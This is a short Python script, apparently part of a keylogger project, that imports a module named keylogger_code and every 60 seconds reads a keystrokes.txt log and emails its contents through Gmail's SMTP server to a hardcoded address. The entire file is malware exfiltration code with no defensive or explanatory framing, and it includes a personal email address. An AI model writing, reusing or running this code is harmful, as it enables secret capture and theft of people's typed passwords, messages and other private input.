import keylogger_code
import smtplib
import time

mail_id = "adithyav8400@gmail.com"
password = ""

def send_mail():
    with open("keystrokes.txt", 'r') as file:
        log_file = file.read()
        
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(mail_id, password)
    server.sendmail(mail_id, mail_id, log_file)
    server.quit()

while True:
    time.sleep(60)
    send_mail()
